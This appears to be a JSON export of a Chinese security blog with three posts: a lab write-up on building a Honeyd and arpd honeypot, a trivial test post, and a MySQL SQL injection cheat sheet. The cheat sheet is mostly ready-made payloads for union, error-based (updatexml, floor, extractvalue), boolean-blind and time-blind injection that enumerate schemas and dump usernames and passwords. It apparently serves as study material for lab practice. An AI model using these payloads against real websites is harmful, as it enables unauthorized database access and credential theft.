[{"title":"test2","date":"2019-10-17T08:56:54.000Z","path":"2019/10/17/test2/","text":"一次实验课：利用honeyd搭建蜜罐Honeyd相关依赖的安装安装g++ gcc（对相关的一些依赖进行源码编译安装）sudo apt-get update &amp;&amp; sudo apt-get install g++ gcc 安装Libevent(非同步事件通知的函数库)通过使用libevent，开发人员可以设定某些事件发生时所执行的函数，可以代替以往程序所使用的循环检查 1234sudo tar -zxvf libevent-1.4.14b-stable.tar.gz sudo ./configure sudo makesudo make install ))) 安装Libdnet(提供跨平台的网络相关的API函数库)包括了ARP缓存，路由表查询，IP包及物理帧的传输 1234sudo tar -zxvf libdnet-1.11.tar.gz sudo ./configuresudo makesudo make install ) 安装Libpcap(一个数据包捕获函数库，大多数网络软件都以它为基础)123456789sudo tar -zxvf libpcap-1.7.3.tar.gzsudo tar -zxvf libpcap-1.5.3.tar.gz sudo ./configuresudo makesudo make install#在Ubuntu下缺少 flex bison 手动安装sudo apt-get install flexsudo apt-get install bison ) 安装ARPD（运行在与Honeyd相同的系统上）是honeyd众多协作工具中最重要的一个工具。ARPD工作时监听局域网内的流量，并通过查看honeyd系统的ARP表判断其他系统是否存活。在蜜罐系统中ARPD会对指定IP地址范围内未使用的IP用honedy的MAC地址做出arp应答。这样对指定IP地址范围内未使用的IP的连接访问都被重定向到蜜罐主机。这样设计可以在内网中最大化的诱导蠕虫病毒，诱导攻击流。 123456sudo tar -zxvf arpd-0.2.tar.gz sudo ./configure #报错：error：expected’)’ before string constant#解决：在arpd.c文件中添加#define __FUNCTION__sudo makesudo make install ))) 安装Honeyd1234sudo tar -zxvf honeyd-1.5c.tar.gzsudo ./configure#报错：configure: error: Couldn&apos;t figure out how to access libc#解决：sudo ln -s /lib/x86_64-linux-gnu/libc.so.6 /usr/lib/libc.so )) 检测arpd和honeyd是否可以运行arpd1234567#运行后显示链接不存在#解决：whereis libevent-1.4.so.2#将libevent-1.4.so.2位置添加到/etc/ld.so.confsudo vim /etc/ld.so.conf#重新加载链接sudo ldconfig )) honeyd123456789honeyd#报错：无法加载libdnet#解决：也是无法链接，但是这个缺少链接文件：whereis libdnet#生成链接sudo cp /usr/local/lib/libdnet.1.0.1 /usr/local/lib/libdnet.so.1.0.1#重新加载sudo /sbin/ldconfigsudo updatedb ) 简单的调试与测试 arpd侦听ens33网卡上的一个空闲的ip:192.168.1.71 sudo arpd -i ens33 192.168.1.71 将honeyd下的config.sample改名并配置蜜罐启动的系统及其配置 123456789101112131415161718192021222324sudo mv config.sample ./honeyd.confsudo vim honeyd.conf# Example of a simple host template and its bindingcreate windows#创建一个windows xp系统的蜜罐set windows personality &quot;Microsoft Windows XP Professional SP1&quot;#设置系统重启时间set windows uptime 1728650#设置最大文件描述符set windows maxfds 35#开启80端口web服务且侦听脚本为honeyd-1.5c/scripts/web.shadd windows tcp port 80 &quot;sh sh //home/toml/Desktop/honeyd/honeyd-1.5c/scripts/web.sh&quot;#开启22，23端口add windows tcp port 22 &quot;sh scripts/test.sh $ipsrc $dport&quot;add windows tcp port 23 proxy $ipsrc:23#add template udp port 53 proxy 141.211.92.141:53#关闭默认的tcp,udp连接set windows default tcp action resetset windows default udp action reset#开启135，139端口add windows tcp port 135 openadd windows tcp port 139 openbind 192.168.1.71 windows 启动honeyd 1sudo honeyd -d -f honeyd.conf -p nmap.prints -x xprobe2.conf -a nmap.assoc -i ens33 192.168.1.71 在同网段下ping，访问web服务 ) 蜜罐的监听显示如下（分别是本机ping蜜罐机192.168.1.71的ping包和本机访问蜜罐主机的80端口建立连接的过程） 蜜罐主机应用的web服务显示的脚本内容 实验思考题如何利用Honeyd实现跨网段的模拟。 回答： 可以利用wmware自带的NAT模式实现路由转发的功能，达到跨网段访问的目的。 可以通过自己手动配置路由表，添加路由规则实现跨网段访问的目的。 实验中的问题 对于Libpcap的安装：在Debian下1.7.3版本太高，会出现头文件的报错，使用1.5.3版本，Ubuntu系统无影响；在Ubuntu下缺少 flex bison ，需要手动安装。 安装完所有的依赖及honeyd后需要配置arpd和honeyd链接的问题，不然无法运行。 参考链接https://blog.csdn.net/key_1997/article/details/81322352（Ubuntu系统） https://blog.csdn.net/accepthjp/article/details/46399715 https://blog.csdn.net/LFGxiaogang/article/details/73287152","tags":[]},{"title":"test","date":"2019-10-17T08:53:54.000Z","path":"2019/10/17/test/","text":"测试一123import sysprint(sys.argv[0]) 测试二测试三","tags":[{"name":"test","slug":"test","permalink":"https://adad456.github.io/tags/test/"}]},{"title":"获取数据库信息","date":"2019-10-17T08:44:05.000Z","path":"2019/10/17/获取数据库信息/","text":"mysql数据库常用函数: system_user()系统用户名 users()用户名 current_user()当前用户名 session_user()连接数据库的用户名 database() 数据库名 version() MYSQL数据库版本 @@datadir 读取数据库路径 @@basedir MYSQL安装路径 @@version_compile_os 操作系统 concat(str1,str2,str3),返回str1+str2+str3;当有一个字符串为NULL时，即返回NULL concat_ws(separator,str1,str2,str3),返回str1+separator+str2+separator+str3 group_concat（str1,str2,str3）,返回str1+str2+str3; ascii(a)将a转换成其ASCII值 ord(a)将a转换成其ASCII值 left(a,b)从左往右截取字符串a的前b个字符 substr(a,b,c)从b位置开始，截取字符串a的c长度 mid(a,b,c)从位置b开始，截取a字符串的c位 regexp、like语句UNION SELECTunion用于连接两个或多个select语句，在注入时需要使前一个select语句为错才能将第二个select语句作为最后输出,即id=-1 查询当前数据库： id=-1&apos; and union select 1,2,database()--+查询所有数据库： id=-1&apos; and union select 1,2,group_concat(schema_name) from information_schema.schemata --+查询表名： id=-1&apos; and union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+查询列名： id=-1&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; --+查询字段值： id=-1&apos; union select 1,2,group_concat(id,username,password) from users--+#基于报错注入 ##updatexml报错注入 updatexml(XML_document,XPath_String,new_value) 获取数据库名、版本信息： id=1&apos; and updatexml(1,concat(0x23,database(),0x23,version(),0x23),1)--+获取表名： id=1&apos; and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x23),1)--+获取列名： id=1&apos; and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),0x23),1)--+获取表users()中的用户名和密码： id=1&apos; and updatexml(1,concat(0x23,(select group_concat(username,0x23,password) from security.users)),1)--+##floor报错注入 floor(rand(0)*2) 爆库： id=1&apos; and (select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y)--+爆库 或： id=1&apos; union select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y--+ 或： id=1&apos; union select 1,2,count(*) from information_schema.columns group by concat(version(),floor(rand(0)*2)) --+爆表： id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by y) as a) --+爆列名： id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(column_name) from information_schema.columns where table_name=&apos;users&apos; limit 5,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+爆字段值: id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(username,&apos;:&apos;,password) from security.users limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+##extractvalue报错注入 extractvalue(xml_frag, xpath_expr) 爆库： id=1&apos; and extractvalue(1,concat_ws(0x23,user(),version(),database(),@@version_compile_os))--+爆表： id=1&apos; and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+爆列名: id=1&apos; and extractvalue(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;)))--+爆字段： id=1&apos; and extractvalue(1,(select group_concat(username,&apos;:&apos;,password) from users))--+#盲注 ##基于布尔的盲注 ascii()返回指定字符串最左侧字符的ascii值 count()计算结果集的数量 length()返回指定字符串的长度 substr(str,pos,len) substring(str,pos,len)返回截取的子字符串判断数据库名的长度 id=1&apos; and (length(database())&gt;9) --+ id=1&apos; and (length(database())=9) --+ id=-1&apos; and (length(database())&gt;0) --+猜数据库名 id=1&apos; and (left(database(),1)=&apos;s&apos;)--+从左到右截取一个字符,s对应的ascii值为115 id=1&apos; and ascii(substr(database(),1,1))=115 --+ id=1&apos; and ascii(substr(database(),1,1))&lt;115 --+可以使用‘&lt;’，‘&gt;’来判断 id=1&apos; and (left(database(),2)=&apos;se&apos;)--+从左到右截取两个字符猜当前数据库中表的数量 id=1&apos; and 4=(select count(table_name) from information_schema.tables where table_schema=database())--+ id=1&apos; and 4=(select count(table_name) from information_schema.tables where table_schema=&apos;security&apos;)--+猜当前数据库中表名的长度 id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),7,1))--+表名的长度即是7-1=6位，这里的limit是取的第一个数据库 id=1&apos; and (length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1)=6))--+ id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 1,1),7,1))--+ 这里的limit是取的第二个数据库 id=1&apos; and (length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 1,1)=8))--+逐个猜解表名 格式为：ascii(substr(xxx limit null,1),null,1) ,对递增依次猜解 id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+对数据库中的第一个表的第一个字符进行ascii的猜解 id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109 --+对数据库中的第一个表的第二个字符进行ascii的猜解猜表中列的数量 id=1&apos; and (select count(column_name) from information_schema.columns where table_name=&apos;users&apos;)=20 --+猜列名的长度 id=1&apos; and ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),2,1)) --+ id=1&apos; and length((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1))=2 --+猜解列名 id=1&apos; and ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1))=105 --+猜字段数量 id=1&apos; and (select count(username) from security.users)=13 --+猜字段长度 id=1&apos; and length((select username from security.users limit 0,1))=4 --+dump字段的值 id=1&apos; and ascii(substr((select username from security.users limit 0,1),1,1))=67--+ id=1&apos; and ascii(substr((select concat(username,&apos;:&apos;,password) from security.users limit 0,1),1,1))=68--+##基于时间的盲注 在获取表名、列名以及具体信息时，方法与布尔盲注相同，都是逐个猜解 if(1,2,3)：如果1为True，则执行2，否则执行3 sleep(x)：执行延迟x秒 ascii(char)：将char转换为对应的ascii码 substr(string,start,len)：从string的start位开始截取len个字符 Benchmark(x,1)：执行表达式1，x次（会消耗CPU，慎用）查看信息 id=1&apos; and if(ascii(substr(user(),1,1))=114,sleep(3),1)查看用户名 id=1&apos; and if(ascii(substr(database(),1,1))=114,sleep(3),1)查看数据库 id=1&apos; and if(ascii(substr(version(),1,1))=114,sleep(3),1)查看数据库版本爆表名 id=-1&apos; and union select if(ascii(substr(table_name,1,1))&gt;97,sleep(5),1),2,3 from information_schema.tables where table_schema = database() limit 0,1爆列名 id=-1&apos; and union select if(ascii(substr(column_name,1,1))=105,sleep(5),1),2,3 from information_schema.columns where table_name = &apos;admin&apos; limit 0,1爆数据 id=-1&apos; and union select if(ascii(substr(user,1,1))=97,sleep(5),1),2,3 from admin limit 0,1","tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://adad456.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"数据库","slug":"数据库","permalink":"https://adad456.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]}]